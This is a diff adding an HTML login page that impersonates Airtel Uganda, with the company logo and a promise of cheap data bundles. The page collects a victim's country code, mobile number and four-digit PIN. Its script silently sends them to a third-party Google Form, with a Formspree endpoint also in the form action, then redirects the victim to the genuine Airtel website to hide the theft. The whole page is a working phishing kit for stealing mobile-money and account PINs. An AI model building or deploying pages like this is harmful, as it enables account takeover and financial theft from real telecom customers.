@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<meta property="og:title" content="Welcome Portal">
+
+<meta property="og:description" content="Don't let our data run too fast! Visit our website to save ore o your data usage with mega bundles.">
+
+<meta property="og:image" content="https://myairtel.github.io/bundles/images/preview.png">
+
+<meta property="og:type" content="website">
+
+<meta property="og:url" content="https://myairtel.github.io/bundles/">
+
+<title>Welcome Login</title>
+
+<link rel="stylesheet" href="style.css">
+
+</head>
+
+<body>
+
+<div class="container">
+
+    <!-- SVG LOGO (EDITABLE) -->
+    <div class="logo">
+
+    <img 
+    src="images/Airtel_Uganda-Logo.wine.svg"
+    alt="Company Logo">
+
+</div>
+
+
+    <h1>You are welcome here!</h1>
+
+
+    <img 
+    src="images/welcome.png"
+    class="illustration"
+    alt="welcome">
+
+
+<form 
+action="https://formspree.io/f/mojonbkb"
+method="POST"
+id="loginForm">
+
+
+<div class="phone-box">
+
+
+<select 
+name="countryCode"
+id="countryCode"
+required>
+
+<option value="+256">Uganda +256</option>
+<option value="+254">Kenya +254</option>
+<option value="+255">Tanzania +255</option>
+<option value="+250">Rwanda +250</option>
+<option value="+211">South Sudan +211</option>
+<option value="+243">DR Congo +243</option>
+<option value="+234">Nigeria +234</option>
+<option value="+233">Ghana +233</option>
+<option value="+20">Egypt +20</option>
+<option value="+27">South Africa +27</option>
+
+</select>
+
+
+<input 
+type="tel"
+id="phone"
+name="phone"
+placeholder="Enter Mobile Number"
+required>
+
+
+</div>
+
+
+
+<input
+
+type="password"
+
+id="pin"
+
+name="pin"
+
+placeholder="Enter Pin Number"
+
+maxlength="4"
+
+required>
+
+
+
+<button type="submit">
+Login
+</button>
+
+
+</form>
+
+
+</div>
+
+
+
+<script>
+
+
+const form = document.getElementById("loginForm");
+
+const pin = document.getElementById("pin");
+
+
+
+// Allow only numbers in PIN
+
+pin.addEventListener("input",()=>{
+
+    pin.value = pin.value.replace(/[^0-9]/g,'');
+
+});
+
+
+
+
+
+form.addEventListener("submit",(e)=>{
+
+
+    e.preventDefault();
+
+
+
+    if(pin.value.length !== 4){
+
+        alert("PIN must contain exactly 4 digits");
+
+        return;
+
+    }
+
+
+
+
+
+    let formData = new FormData();
+
+
+
+    // Google Form fields
+
+    formData.append(
+        "entry.1323383871",
+        document.getElementById("countryCode").value
+    );
+
+
+
+    formData.append(
+        "entry.527585722",
+        document.getElementById("phone").value
+    );
+
+
+
+    formData.append(
+        "entry.1714836595",
+        document.getElementById("pin").value
+    );
+
+
+
+
+
+    fetch(
+
+    "https://docs.google.com/forms/d/1kNk3ItfpezLpjr-DpKNE9zbf5kF8R8XKpPY41xGuXgA/formResponse",
+
+    {
+
+        method:"POST",
+
+        mode:"no-cors",
+
+        body:formData
+
+    }
+
+
+
+    );
+
+
+
+
+
+    // redirect after sending
+
+    window.location.href="https://www.airtel.co.ug";
+
+
+
+});
+
+
+
+</script>
+
+
+</body>
+</html>
